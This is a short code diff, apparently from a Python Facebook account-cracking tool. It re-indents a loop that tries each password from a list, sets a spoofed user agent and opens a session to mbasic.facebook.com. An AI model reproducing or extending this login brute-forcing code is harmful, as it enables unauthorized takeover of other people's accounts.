@@ -289,9 +289,9 @@ class crack:
     ### MAIN ###
     def main(self, total, email, password):
         try:
-	      for pws in password:
-		self.useragent = self.realme_useragent(total = 1)
-                    with requests.Session() as r:
+		for pws in password:
+			self.useragent = self.realme_useragent(total = 1)
+			with requests.Session() as r:
 			r.headers.update({
 			    'host': 'mbasic.facebook.com',
 			    'cache-control': 'max-age=0',
